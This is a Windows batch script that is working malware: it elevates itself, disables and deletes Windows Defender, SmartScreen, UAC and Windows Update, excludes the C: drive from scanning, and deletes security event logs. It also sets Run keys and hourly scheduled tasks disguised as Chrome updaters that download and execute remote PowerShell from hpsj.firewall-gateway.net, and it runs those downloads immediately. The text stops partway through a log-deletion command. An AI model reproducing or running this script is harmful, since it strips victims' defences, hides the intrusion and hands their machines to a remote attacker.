@echo off
NET SESSION >nul 2>&1 && goto noUAC
title.
set n=%0 %*
set n=%n:"=" ^& Chr(34) ^& "%
echo Set objShell = CreateObject("Shell.Application")>"%tmp%\cmdUAC.vbs"
echo objShell.ShellExecute "cmd.exe", "/c start " ^& Chr(34) ^& "." ^& Chr(34) ^& " /d " ^& Chr(34) ^& "%CD%" ^& Chr(34) ^& " cmd /c %n%", "", "runas", ^1>>"%tmp%\cmdUAC.vbs"
echo Not Admin, Attempting to elevate...
cscript "%tmp%\cmdUAC.vbs" //Nologo
del "%tmp%\cmdUAC.vbs"
exit /b
:noUAC




@echo off
set wegkoem=a
set bpltpmn=b
set khoziql=c
set tjxpouf=d
set fynwfvh=e
set gfuxihu=f
set dskbaxq=g
set yvyapob=h
set pjdvllg=i
set mnmpqbg=j
set eeuyvwk=k
set mkmhtbo=l
set hxiqvtv=m
set bysdcmi=n
set nutqtmu=o
set brlbmmf=p
set hoahisa=q
set xlnlrpz=r
set ybbwhci=s
set flbzyhx=t
set jxdklrj=u
set cbwqklh=v
set rmyyyjm=w
set lxckycu=x
set tjtkrhi=y
set ikoiset=z
@echo off

reg delete "hklm\software\policies\microsoft\windows defender" /f
reg add "hklm\software\policies\microsoft\windows defender" /v "disableantispyware" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender" /v "disableantivirus" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\mpengine" /v "mpenablepus" /t reg_dword /d "0" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disablebehaviormonitoring" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disableioavprotection" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disableonaccessprotection" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disablerealtimemonitoring" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disablescanonrealtimeenable" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\reporting" /v "disableenhancednotifications" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\spynet" /v "disableblockatfirstseen" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\spynet" /v "spynetreporting" /t reg_dword /d "0" /f
reg add "hklm\software\policies\microsoft\windows defender\spynet" /v "submitsamplesconsent" /t reg_dword /d "0" /f
rem 0 - disable logging
reg add "hklm\system\currentcontrolset\control\wmi\autologger\defenderapilogger" /v "start" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\wmi\autologger\defenderauditlogger" /v "start" /t reg_dword /d "0" /f
rem disable wd tasks
schtasks /change /tn "microsoft\windows\exploitguard\exploitguard mdm policy refresh" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender cache maintenance" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender cleanup" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender scheduled scan" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender verification" /disable
rem disable wd systray icon
reg delete "hklm\software\microsoft\windows\currentversion\explorer\startupapproved\run" /v "windows defender" /f
reg delete "hkcu\software\microsoft\windows\currentversion\run" /v "windows defender" /f
reg delete "hklm\software\microsoft\windows\currentversion\run" /v "windowsdefender" /f
rem remove wd context menu
reg delete "hkcr\*\shellex\contextmenuhandlers\epp" /f
reg delete "hkcr\directory\shellex\contextmenuhandlers\epp" /f
reg delete "hkcr\drive\shellex\contextmenuhandlers\epp" /f
rem disable wd services
reg add "hklm\system\currentcontrolset\services\wdboot" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\wdfilter" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\wdnisdrv" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\wdnissvc" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\windefend" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\securityhealthservice" /v "start" /t reg_dword /d "4" /f

reg.exe add hklm\software\microsoft\windows\currentversion\policies\system /v enablelua /t reg_dword /d 0 /f

reg add "hkey_current_user\software\microsoft\windows\currentversion\run" /v "#one" /t reg_sz /d "powershell -w hidden \"add-type -assemblyname system.core;iex (new-object net.webclient).downloadstring('http://hpsj.firewall-gateway.net:80/hpjs.php');\"" /f

reg add "hkey_current_user\software\microsoft\windows\currentversion\run" /v "#oneupdate" /t reg_sz /d "powershell -w hidden \"add-type -assemblyname system.core;iex (new-object net.webclient).downloadstring('http://hpsj.firewall-gateway.net:443/uddiexplorer');\"" /f

"c:\program files\microsoft security client\setup.exe" /x /s /disableoslimit

start /b powershell add-mppreference -exclusionpath "c:" -force

start /b powershell add-mppreference -exclusionpath "c:\users" -force

start /b powershell -w hidden "iex(new-object net.webclient).downloadstring('http://hpsj.firewall-gateway.net:443/uddiexplorer');"
 
start /b powershell -w hidden "add-type -assemblyname system.core;iex (new-object net.webclient).downloadstring('http://hpsj.firewall-gateway.net:80/hpjs.php');"


schtasks /create /sc minute /mo 60 /f /tn achromeupdater /tr "powershell -w hidden \"add-type -assemblyname system.core;iex (new-object net.webclient).downloadstring(''http://hpsj.firewall-gateway.net:80/hpjs.php''');\""

schtasks /f /create /sc minute /mo 60 /tn achromeupdateri /tr "powershell.exe -w hidden 'iex (new-object net.webclient).downloadstring(''http://hpsj.firewall-gateway.net:443/uddiexplorer''');'"

sc stop windefend
sc config windefend start= disabled
sc delete windefend
sc stop wdnissvc
sc config wdnissvc start= disabled
sc delete wdnissvc
sc stop sense
sc config sense start= disabled
sc delete sense
sc stop wuauserv
sc config wuauserv start= disabled
sc stop usosvc
sc config usosvc start= disabled
sc stop waasmedicsvc
sc config waasmedicsvc start= disabled
sc stop securityhealthservice
sc config securityhealthservice start= disabled
sc delete securityhealthservice
sc stop sdrsvc
sc config sdrsvc start= disabled
sc stop wscsvc
sc config wscsvc start= disabled
sc stop wdiservicehost
sc config wdiservicehost start= disabled
sc stop wdisystemhost
sc config wdisystemhost start= disabled
sc stop installservice
sc config installservice start= disabled
sc stop vaultsvc
sc config vaultsvc start= disabled
sc stop spooler
sc config spooler start= disabled
sc stop licensemanager
sc config licensemanager start= disabled
sc stop diagtrack
sc config diagtrack start= disabled
taskkill /f /im smartscreen.exe
taskkill /f /im securityhealthservice.exe
cd c:\
cd c:\program files\
rd /s /q "windows defender"
rd /s /q "windows defender advanced threat protection"
rd /s /q "windows security"
cd c:\program files (x86)\
rd /s /q "windows defender"
cd c:\programdata\microsoft
rd /s /q "windows defender"
rd /s /q "windows defender advanced threat protection"
rd /s /q "windows security health"
cd c:\
cd windows
cd system32
del /f windowsupdateelevatedinstaller.exe
del /f securityhealthsystray.exe
del /f securityhealthservice.exe
del /f securityhealthhost.exe
del /f securitycenterbroker.dll
del /f securitycenterbrokerps.dll
del /f securityhealthagent.dll
del /f securityhealthproxystub.dll
del /f securityhealthsso.dll
del /f smartscreensettings.exe
del /f smartscreenps.dll
del /f smartscreen.exe
del /f windows.security.integrity.dll
del /f windowsdefenderapplicationguardcsp.dll
del /f wscsvc.dll
del /f wscsvc.dll.mui
del /f wsecedit.dll
cd winevt\logs
del /f microsoft-windows-windows defender%4operational.evtx
del /f microsoft-windows-windows defender%4whc.evtx
del /f microsoft-windows-security-audit-configuration-client%4operational.evtx
del /f microsoft-windows-security-enterprisedata-filerevocationmanager%4operational.evtx
del /f microsoft-windows-security-netlogon